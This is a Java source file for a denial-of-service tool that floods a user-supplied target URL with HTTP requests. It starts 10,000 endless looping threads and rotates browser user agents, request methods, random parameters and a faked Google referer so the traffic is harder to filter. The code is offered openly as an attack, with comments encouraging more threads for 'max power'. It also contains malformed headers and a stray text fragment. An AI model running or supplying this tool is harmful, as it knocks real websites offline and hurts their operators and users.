import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Random;
import java.util.Scanner;
import java.util.concurrent.atomic.AtomicBoolean;

public class DdosAttack {
public static void main(String[] args) throws Exception {
Scanner scanner = new Scanner(System.in);
System.out.print("Enter the target URL: ");
String targetUrl = scanner.nextLine();

TEXT
66 lines


String[] userAgents = {
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
    "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17",
    "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
    "Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4",
    "Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
};

    int threadsCount = 10000; // increase thread count for max power!
    for (int i = 0; i < threadsCount; i++) {
        DdosThread thread = new DdosThread(targetUrl, userAgents);
        thread.start();
    }
}

public static class DdosThread extends Thread {
    private AtomicBoolean running = new AtomicBoolean(true);
    private final String request;
    private final URL url;
    private final String[] userAgents;
    private final Random random = new Random();

    public DdosThread(String request, String[] userAgents) throws Exception {
        this.request = request;
        this.url = new URL(request);
        this.userAgents = userAgents;
    }

    @Override
    public void run() {
        while (running.get()) {
            try {
                attack();
            } catch (Exception e) {}
        }
    }

    public void attack() throws Exception {
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();

        connection.setDoOutput(true);
        connection.setDoInput(true);

		String methodType[]={"GET", "POST", "HEAD"};
		connection.setRequestMethod(methodType[random.nextInt(methodType.length)]);

		connection.setRequestProperty("charset", "utf-8");
		connection.setRequestProperty("Host", this.request);

		String randomUserAgent=userAgents[random.nextInt(userAgents.length)];
		connection.setRequestProperty("User-Agent", randomUserAgent);

		connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
		
		String param="param" + random.nextInt(Integer.MAX_VALUE)+"="+URLEncoder.encode(""+random.nextInt(Integer.MAX_VALUE), "UTF-8");
		connection.setRequestProperty("Content-Length", param);
		
		connection.setRequestProperty("Referer","https://www.google.com/");
		connection.setRequestProperty("Accept-Language","en-US,en;q=0.9");
		
		System.out.println(this+" "+connection.getResponseCode());
		
		connection.getInputStream();
		
		Thread.sleep(random.nextInt(100));   // add small delay between attacks to avoid self-overload!
    }
}
}
